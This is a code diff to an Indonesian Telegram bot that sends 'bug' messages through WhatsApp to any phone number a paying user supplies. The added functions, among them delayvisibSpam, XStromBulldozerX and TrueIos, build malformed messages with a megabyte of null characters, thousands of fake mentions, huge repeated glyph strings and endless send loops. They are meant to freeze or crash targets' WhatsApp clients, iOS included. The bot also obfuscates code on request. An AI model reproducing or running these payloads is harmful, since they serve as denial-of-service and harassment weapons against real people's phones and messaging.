@@ -794,8 +794,8 @@ Total Pengguna: ${Object.keys(userActivity).length}
 // --- Contoh Command dan Middleware ---
 const prosesrespone = async (target, ctx) => {
   
-    const ProsesColi = `\`\`\`\n
-✦━━〔 𝐊𝐔𝐋𝐓𝐔𝐒 𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ━━✦
+    const ProsesColi = `
+✦━━〔 EXORCIST COMMUNITY ━━✦
 
 ☠ 𝗦𝗧𝗔𝗧𝗨𝗦
 ↳ Bug telah berhasil dikirim ke target ritual
@@ -805,20 +805,20 @@ const prosesrespone = async (target, ctx) => {
 ↳ Biarkan entitas pengirim tetap tersembunyi
 
 ⛧ 𝗗𝗜𝗧𝗔𝗡𝗗𝗔𝗜
-↳ Oleh entitas gelap: 𝚉𝙴𝚁𝙾𝚇 🕷️
+↳ Oleh entitas gelap: EXO 🕷️
 
-✦━━━━━━━━━━━━━━━━━━━━━✦\`\`\`   `;
+✦━━━━━━━━━━━━━━━━━━━━━✦  `;
 
-    await ctx.replyWithPhoto("https://files.catbox.moe/daxaxe.jpg", {
+    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
       caption: ProsesColi,
-      parse_mode: "Markdown"
+      parse_mode: "HTML"
     })
 };
 
 const donerespone = async (target, ctx) => {
   
-    const SuksesCrot = `\`\`\`\n
-✦━━〔 𝐊𝐔𝐋𝐓𝐔𝐒 𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ━━✦
+    const SuksesCrot = `
+✦━━〔 EXORCIST COMMUNITY ━━✦
 
 ☠ 𝗦𝗧𝗔𝗧𝗨𝗦
 ↳ Bug telah berhasil dikirim ke target ritual
@@ -828,15 +828,17 @@ const donerespone = async (target, ctx) => {
 ↳ Biarkan entitas pengirim tetap tersembunyi
 
 ⛧ 𝗗𝗜𝗧𝗔𝗡𝗗𝗔𝗜
-↳ Oleh entitas gelap: 𝚉𝙴𝚁𝙾𝚇 🕷️
+↳ Oleh entitas gelap: EXO 🕷️
 
-✦━━━━━━━━━━━━━━━━━━━━━✦\`\`\`
+✦━━━━━━━━━━━━━━━━━━━━━✦
     `;
 
-    await ctx.replyWithPhoto("https://files.catbox.moe/mn8afh.jpg", {
+    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
       caption: SuksesCrot,
-      parse_mode: "Markdown"
-    })
+      parse_mode: "HTML", 
+      replyMarkup =
+       { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "bugmenux" }]]
+    });
 };
 
 const checkWhatsAppconnection = async (ctx, next) => {
@@ -886,7 +888,8 @@ bot.command("easydelay", checkWhatsAppconnection, checkPremium, async ctx => {
     await prosesrespone(target, ctx);
 
     for (let i = 0; i < 100; i++) {
-      await invisihard3(target, true);
+      await despiczy(target);
+      await TrueNullv3(target);
     }
 
     await donerespone(target, ctx);
@@ -903,8 +906,17 @@ bot.command("freeze", checkWhatsAppconnection, checkPremium, async ctx => {
 
     await prosesrespone(target, ctx);
 
-    for (let i = 0; i < 1; i++) {
-      await FrizHome(isTarget);
+    for (let i = 0; i < 50; i++) {
+      await HxDZiaoXang(target);
+      await sleep(1000);
+      await FreezeChat(target);
+      await sleep(1000);
+      await frezeeClick(target);
+      await sleep(1000);
+      await HxDPrince(target);
+      await sleep(1000);
+      await HxDZiaoXang(target);
+      await sleep(1000) 
     }
 
     await donerespone(target, ctx);
@@ -921,8 +933,9 @@ bot.command("drain", checkWhatsAppconnection, checkPremium, async ctx => {
 
     await prosesrespone(target, ctx);
 
-     for (let i = 0; i < 1; i++) {
-     await bulldozer1TB(sock, target);
+     for (let i = 0; i < 100; i++) {
+     await Truenullv4(target, ptcp = true);
+     await XStromBulldozerX(target, true);
      }
 
     await donerespone(target, ctx);
@@ -940,9 +953,11 @@ bot.command("xcrash", checkWhatsAppconnection, checkPremium, async ctx => {
     await prosesrespone(target, ctx);
 
     for (let i = 0; i < 10; i++) {
-      await Crash(target);
+      await Crash(target, true);
       await sleep(1000);
-      await amountOne(target);
+      await amountOne(target, true);
+      await sleep(1000);
+      await nullExc(target, true);
       await sleep(1000);
     }
 
@@ -961,10 +976,10 @@ bot.command("combo", checkWhatsAppconnection, checkPremium, async ctx => {
     await prosesrespone(target, ctx);
 
     for (let i = 0; i < 35; i++) {
-      await InvisibleFC(sock, target);
-      await FrizHome(isTarget);
-      await Crash(target);
-      await protocolbug8(target, true);
+      await nullExc(target, true);
+      await Truenullv4(target, ptcp = true);
+      await HxDZiaoXang(target);
+      await Crash(target, true)
     }
 
     await donerespone(target, ctx);
@@ -981,16 +996,44 @@ bot.command("hardelay", checkWhatsAppconnection, checkPremium, async ctx => {
 
     await prosesrespone(target, ctx);
 
-    for (let i = 0; i < 30; i++) {
-      await protocolbug8(target, true);
-      await InvisibleFC(sock, target);
-      await FrizHome(isTarget);
+    for (let i = 0; i < 50; i++) {
+     await tesfang(target);
+              await sleep(1000);
+     await locaDelay(target);
+              await sleep(1000);
+              await buttonDelay(target);
+              await sleep(1000);
     }
 
     await donerespone(target, ctx);
 });
 
 bot.command("rimuru", checkWhatsAppconnection, checkPremium, async ctx => {
+    const q = ctx.message.text.split(" ")[1];
+              const delay = (ms) => new Promise(res => setTimeout(res, ms));
+              const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);
+
+    if (!q) {
+        return await ctx.reply(`Example: commandnya 62×××`);
+    }
+
+    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+    await prosesrespone(target, ctx);
+
+    for (let i = 0; i < 50; i++) {
+      await delayvisibSpam(target, true);
+      await SlowDelay();
+      await Truenullv4(target, ptcp = true);
+      await SlowDelay();
+      await TrueNullv3(target);
+      await SlowDelay();
+    }
+
+    await donerespone(target, ctx);
+});
+
+bot.command("viora", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
 
     if (!q) {
@@ -1001,10 +1044,77 @@ bot.command("rimuru", checkWhatsAppconnection, checkPremium, async ctx => {
 
     await prosesrespone(target, ctx);
 
-    for (let i = 0; i < 30; i++) {
-      await protocolbug8(target, true);
-      await invisihard3(target, true);
-      await protocolbug7(target, true);
+    for (let i = 0; i < 50; i++) {
+     await XvZDonger(target);
+              await sleep(1000);
+     await juleenakah(target);
+              await sleep(1000);
+              await gacorbgklz(target);
+              await sleep(1000);
+              await gacorbgklz(target);
+              await sleep(1000);           
+    }
+
+    await donerespone(target, ctx);
+});
+
+bot.command("ultimate", checkWhatsAppconnection, checkPremium, async ctx => {
+    const q = ctx.message.text.split(" ")[1];
+
+    if (!q) {
+        return await ctx.reply(`Example: commandnya 62×××`);
+    }
+
+    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+    await prosesrespone(target, ctx);
+
+    for (let i = 0; i < 50; i++) {
+     await packBlank(target);
+              await sleep(1000);
+     await blanknih(target);
+              await sleep(1000);
+              await Sparkblank(target);
+              await sleep(1000);
+              await blankxzvr(target);
+              await sleep(1000);
+              await InvisCall(target);
+              await sleep(1000);
+              await CrashHit(target);
+              await sleep(1000);
+    }
+
+    await donerespone(target, ctx);
+});
+
+bot.command("ultimatum", checkWhatsAppconnection, checkPremium, async ctx => {
+    const q = ctx.message.text.split(" ")[1];
+
+    if (!q) {
+        return await ctx.reply(`Example: commandnya 62×××`);
+    }
+
+    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+    await prosesrespone(target, ctx);
+
+    for (let i = 0; i < 50; i++) {
+     await Notifcrash(target);
+              await sleep(1000);
+     await HxDClaws(target);
+              await sleep(1000);
+              await HardLocUI(target);
+              await sleep(1000);
+              await zwspCrashUi(target);
+              await sleep(1000);
+              await NotifUI(target);
+              await sleep(1000);
+              await Uipayload(target);
+              await sleep(1000);
+              await galleryBugUI(target);
+              await sleep(1000);
+              await LocaliveUI(target);
+              await sleep(1000);
     }
 
     await donerespone(target, ctx);
@@ -1021,9 +1131,13 @@ bot.command("vasion", checkWhatsAppconnection, checkPremium, async ctx => {
 
     await prosesrespone(target, ctx);
 
-    for (let i = 0; i < 15; i++) {
-      await ApiBug(22, target);
-      await robustfreeze(target, Ptcp = true);
+    for (let i = 0; i < 50; i++) {
+      await TrueIos(target);
+      await ZenoIosExe(target);
+      await docIos(target);
+      await ioszzz(target);
+      await CtcBizArray(target);
+      await rpnm(target);
     }
 
     await donerespone(target, ctx);
@@ -1181,7 +1295,7 @@ bot.command("enchard", checkPremium, async (ctx) => {
             throw new Error("File bukan dalam format string yang valid.");
         }
 
-        ctx.reply("Sabar.. Lagi di Encrypt sama Kultus");
+        ctx.reply("Sabar.. Lagi di Encrypt");
 
         let obfuscatedCode = await JsConfuser.obfuscate(codeString, {
             target: "node",
@@ -1204,7 +1318,7 @@ bot.command("enchard", checkPremium, async (ctx) => {
             calculator: true,
             hexadecimalNumbers: true,
             shuffle: true,
-            identifierGenerator: () => "高宝座ZEROXSUKALOBANG齐Xz高宝座" + Math.random().toString(36).substring(7),
+            identifierGenerator: () => "高宝座DAMN齐Xz高宝座" + Math.random().toString(36).substring(7),
         });
 
         if (typeof obfuscatedCode === 'object' && obfuscatedCode.code) {
@@ -1222,7 +1336,7 @@ bot.command("enchard", checkPremium, async (ctx) => {
 
         await ctx.replyWithDocument(
             { source: encryptedFilePath, filename: `encrypted_${fileName}` },
-            { caption: `✅ Encryption Successful\n• Type: Hades Hard\n• By @zeroxploitt7` }
+            { caption: `✅ Encryption Successful\n• Type: Hades Hard\n• By @Putxzyy` }
         );
 
         fs.unlinkSync(encryptedFilePath);
@@ -1279,7 +1393,7 @@ bot.command("encninecore", checkPremium, async (ctx) => {
             movedDeclarations: true,
             objectExtraction: true,
             globalConcealing: true,
-            identifierGenerator: () => "高宝座AMPASKULTUS齐Xz高宝座" + Math.random().toString(36).substring(7),
+            identifierGenerator: () => "高宝座AMPAS齐Xz高宝座" + Math.random().toString(36).substring(7),
         });
 
         if (typeof obfuscatedCode === 'object' && obfuscatedCode.code) {
@@ -1297,7 +1411,7 @@ bot.command("encninecore", checkPremium, async (ctx) => {
 
         await ctx.replyWithDocument(
             { source: encryptedFilePath, filename: `encrypted_${fileName}` },
-            { caption: `✅ Successful Encrypt\n• Type: Hades Nine Core\n• By @zeroxploitt7` }
+            { caption: `✅ Successful Encrypt\n• Type: Hades Nine Core\n• By @Putxzyy` }
         );
 
         fs.unlinkSync(encryptedFilePath);
@@ -1376,15 +1490,18 @@ bot.action('bugmenux', async (ctx) => {
 ┏━━━༺ 🜏 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 🜏 ༻━━┓
 ┃ ▷ /easydelay 62xx ⟶ ᴇᴀsʏ ᴅᴇʟᴀʏ
 ┃ ▷ /freeze 62xx ⟶ 𝙵𝚁𝙴𝙴𝚉𝙴 𝙷𝙾𝙼𝙴
-┃ ▷ /drain 62xx ⟶ ᴅᴇʟᴀʏ × ǫᴜᴏᴛᴀ ᴅʀᴀɪɴ
-┃ ▷ /xcrash 62xx ⟶ 𝙲𝚁𝙰𝚂𝙷 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴
+┃ ▷ /drain 62xx ⟶  ǫᴜᴏᴛᴀ ᴅʀᴀɪɴ
+┃ ▷ /xcrash 62xx ⟶ 𝙲𝚁𝙰𝚂𝙷 𝙾𝙽𝙴 𝙼𝚂𝙶 
 ┗━━━━━━━━━━━━━━━━━━━━━━┛
 
 ┏━━━༺ ✦ 𝐇𝐀𝐑𝐃-𝐂𝐎𝐑𝐄 ✦ ༻━━┓
 ┃ ▷ /combo 62xx ⟶ 𝙲𝙾𝙼𝙱𝙾 𝙰𝙻𝙻 𝙱𝚄𝙶
 ┃ ▷ /hardelay 62xx ⟶ 𝙷𝙰𝚁𝙳 𝙳𝙴𝙻𝙰𝚈 𝚅𝟷
 ┃ ▷ /rimuru 62xx ⟶ 𝙷𝙰𝚁𝙳 𝙳𝙴𝙻𝙰𝚈 𝚅𝟸
-┃ ▷ /vasion 62xx ⟶ 𝙳𝙴𝙻𝙰𝚈 × 𝙵𝚁𝙴𝙴𝚉𝙴
+┃ ▷ /viora 62xx ⟶ 𝙱𝙻𝙰𝙽𝙺 𝚅𝟷
+┃ ▷ /ultimate 62xx ⟶ 𝙱𝙻𝙰𝙽𝙺 𝚅𝟸
+┃ ▷ /ultimatum 62xx
+┃ ▷ /vasion 62xx ⟶ 𝙲𝚁𝙰𝚂𝙷 𝙸𝙾𝚂
 ┗━━━━━━━━━━━━━━━━━━━━━━━┛
 
 ┏━━━━༺ ⚠ 𝐍𝐎𝐓𝐄𝐒 ⚠ ༻━━┓
@@ -3523,7 +3640,7 @@ async function HxDTractor(target) {
     }
   );
 }
-async function TrueNull(sock, target) {
+async function TrueNull(target) {
   const module = {
     message: {
       ephemeralMessage: {
@@ -3772,6 +3889,69 @@ async function TrueNullv3(target) {
   });
 
   console.log(chalk.red(`Succes Send ${target}`));
+}
+
+async function delayvisibSpam(target, mention) {
+console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+  let biji = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "σƭαא ɦαเ",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\u0000".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "galaxy_message"
+        }
+      }
+    }
+  }, {
+    ephemeralExpiration: 0,
+    forwardingScore: 0,
+    isForwarded: false,
+    font: Math.floor(Math.random() * 9),
+    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
+  });
+
+  await sock.relayMessage("status@broadcast", biji.message, {
+    messageId: biji.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              { tag: "to", attrs: { jid: target }, content: undefined }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+
+  if (mention) {
+    while (true) {
+      await sock.relayMessage(target, {
+        statusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: biji.key,
+              type: 25
+            }
+          }
+        }
+      }, {});
+    }
+  }
 }
 
 async function Truenullv4(target, ptcp = true) {
@@ -4354,6 +4534,126 @@ async function CardsResp(target) {
   });
 }
 
+async function XStromBulldozerX(target, mention) {
+  let parse = true;
+  let SID = "5e03e0";
+  let key = "10000000_2203140470115547_947412155165083119_n.enc";
+  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
+  let type = `image/webp`;
+  if (11 > 9) {
+    parse = parse ? false : true;
+  }
+
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
+          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
+          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
+          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
+          mimetype: type,
+          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
+          fileLength: {
+            low: Math.floor(Math.random() * 1000),
+            high: 0,
+            unsigned: true,
+          },
+          mediaKeyTimestamp: {
+            low: Math.floor(Math.random() * 1700000000),
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            participant: target,
+            mentionedJid: [
+              "131338822@s.whatsapp.net",
+              ...Array.from(
+                { length: 1900 },
+                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+            ],
+            remoteJid: "X",
+            participant: target,
+            stanzaId: "1234567890ABCDEF",
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 3,
+                expiryTimestamp: Date.now() + 1814400000
+              },
+            },
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: Math.floor(Math.random() * -20000000),
+            high: 555,
+            unsigned: parse,
+          },
+          isAvatar: parse,
+          isAiSticker: parse,
+          isLottie: parse,
+        },
+      },
+    },
+  };
+
+  const msg = generateWAMessageFromContent(target, message, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+  
+  if (mention) {
+    await sock.relayMessage(
+      target,
+      {
+        statusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: msg.key,
+              type: 25
+            }
+          }
+        }
+      },
+      {
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: { is_status_mention: "" },
+            content: undefined
+          }
+        ]
+      }
+    );
+  }
+}
 
 //Ios
 async function CtcBizArray(target) {
@@ -4797,6 +5097,40 @@ async function ZenoIosExe(target) {
   console.log(chalk.red(`─────「 ⏤Succes Sending CrashIos⏤ 」─────`));
   await sleep(2500);
   }
+}
+
+async function TrueIos(target) {
+  await xata.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        locationMessage: {
+          degreesLatitude: 999.27838,
+          degreesLongitude: -127.929,
+          name: `X` + "𑇂𑆵𑆴𑆿".repeat(60000),
+          url: null,
+          contextInfo: {
+            mentionedJid: Array.from(
+              { length: 2000 },
+              (_, z) => `628${z + 1}@s.whatsapp.net`
+            ),
+            externalAdReply: {
+              quotedAd: {
+                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
+                mediaType: "Video",
+                jpegThumbnail: null,
+                caption: "𑇂𑆵𑆴𑆿".repeat(60000)
+              },
+              placeholderKey: {
+                remoteJid: "0s.whatsapp.net",
+                fromMe: false,
+                id: "ABCDEF1234567890"
+              }
+            }
+          }
+        }
+      }
+    }
+  }, { participant: { jid: target } });
 }
 
 // --- Jalankan Bot ---
